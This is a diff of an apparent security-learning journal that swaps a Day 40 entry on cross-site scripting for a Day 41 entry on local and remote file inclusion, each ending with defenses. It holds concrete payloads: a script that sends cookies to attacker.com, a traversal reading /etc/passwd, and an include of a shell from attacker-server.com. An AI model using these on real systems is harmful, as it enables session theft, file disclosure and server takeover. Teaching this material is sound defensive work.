@@ -1,32 +1,26 @@
-## 🗓️ Day 40/100 – Cross-Site Scripting (XSS)
+## 🗓️ Day 41/100 – File Inclusion (LFI/RFI)
 
-**Focus:** Exploiting client-side script execution to steal sessions and manipulate user actions.
+**Focus:** Exploiting insecure file handling to read sensitive data or execute arbitrary code.
 
-### 🎭 What is XSS?
-Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. The script executes within the context of the victim's session.
+### 📂 What is File Inclusion?
+Vulnerabilities occurring when an application builds a file path using user-supplied data without validation.
 
-### ⚔️ Attack Techniques
+### ⚔️ Attack Vectors
 
-**1. Session Stealing (Cookie Theft)**
-*   **Payload:**
-    ```javascript
-    <script>location.href='http://attacker.com/steal.php?cookie='+document.cookie</script>
-    ```
-*   **Impact:** Attacker obtains the Session ID and can impersonate the victim without credentials.
+**1. Local File Inclusion (LFI)**
+*   **Scenario:** URL is `http://site.com/index.php?page=about.php`
+*   **Payload:** `?page=../../../../etc/passwd`
+*   **Impact:** Read sensitive local files (config files, source code, password hashes).
+*   **Escalation:** **LFI to RCE** via Log Poisoning (injecting PHP into Apache logs and including the log file).
 
-**2. Reflected XSS**
-*   **Scenario:** Search bar reflects input.
-*   **URL:** `http://target.com/search?q=<script>alert(1)</script>`
-*   **Result:** Popup executes immediately.
-
-**3. Stored XSS**
-*   **Scenario:** Comment section or Profile Bio.
-*   **Action:** Input payload into the database.
-*   **Result:** Every user (including Admin) who views the profile executes the script.
+**2. Remote File Inclusion (RFI)**
+*   **Requirement:** `allow_url_include = On` in php.ini
+*   **Payload:** `?page=http://attacker-server.com/shell.txt`
+*   **Impact:** The server fetches and executes the external script. Immediate full system compromise.
 
 ### 🛡️ Defense Mechanisms
-*   **Output Encoding:** Convert special characters into HTML entities (e.g., `<` becomes `&lt;`).
-*   **HttpOnly Cookies:** Prevent JavaScript from accessing sensitive cookies (`document.cookie` returns empty).
-*   **CSP (Content Security Policy):** A browser mitigation that strictly controls script sources.
+*   **ID Mapping:** Use an ID system (e.g., `?page=1` maps to `home.php`) rather than filenames.
+*   **Basename Validation:** Ensure the input contains only the filename, not the path (`/` or `\`).
+*   **Configuration:** Set `allow_url_fopen` and `allow_url_include` to `Off`.
 
-**Day 40 Takeaway:** XSS turns the user's browser against them. Preventing it requires rigorous separation of data and code in the browser.
+**Day 41 Takeaway:** File paths are dangerous inputs. If you control the path, you often control the server.
